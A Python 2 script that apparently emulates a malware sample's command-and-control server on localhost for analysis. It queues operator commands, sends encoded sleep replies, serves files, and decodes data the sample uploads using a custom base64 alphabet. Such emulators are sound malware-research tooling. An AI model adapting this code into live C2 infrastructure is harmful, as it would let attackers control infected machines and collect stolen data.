import base64
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import re
import os


# Decodes modified base 64 of sample to ASCII
def decodeModified64(modified):
    normBase = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    modBase  = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/="
    normal = ""

    for c in modified:
        normal += normBase[modBase.index(c)]

    return normal

# Command and control server
class CCHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Verifying request
        if(re.match("^/Default\.aspx\?INDEX=[A-Z]{10}$",self.path) != None):
            if(os.path.exists("send.txt")):
                # Sending command from user
                f = open("send.txt", 'r')
                data = f.read()
                print "Sending: " + data
                f.close()
            else:
                # No command from user, so sleep
                print "Sleep 2235ms"
                data = "<!--8Ocz8Ocz8M==--!>"

            # Delete sent command
            if(os.path.exists("send.txt")):
                os.remove("send.txt")

            # Send response
            self.send_response(200)
            self.send_header('Content-type','text-html')
            self.end_headers()
            self.wfile.write(data)
        # Adding file download functionality
        elif os.path.exists(self.path[1:]):
            # Stripping slash from beginning
            f = open(self.path[1:])
            data = f.read()
            print "Sending: " + data
            f.close()

            # Sending response
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.send_header('Content-length',str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            
        return
    
    def do_POST(self):
        # Verifying request
        if(re.match("^/Default\.aspx\?ID=[A-Z]{10}$",self.path) != None):
            self.send_response(200)
            # Recieving data from sample
            f = open("recv.txt", 'w')
            print "Received: " + base64.b64decode(decodeModified64(self.rfile._rbuf.getvalue()))
            f.write(base64.b64decode(decodeModified64(self.rfile._rbuf.getvalue())))
            f.close()
        

# Starting server
server = ('127.0.0.1', 80)
httpd = HTTPServer(server, CCHTTPRequestHandler)
print "Server running..."
httpd.serve_forever()
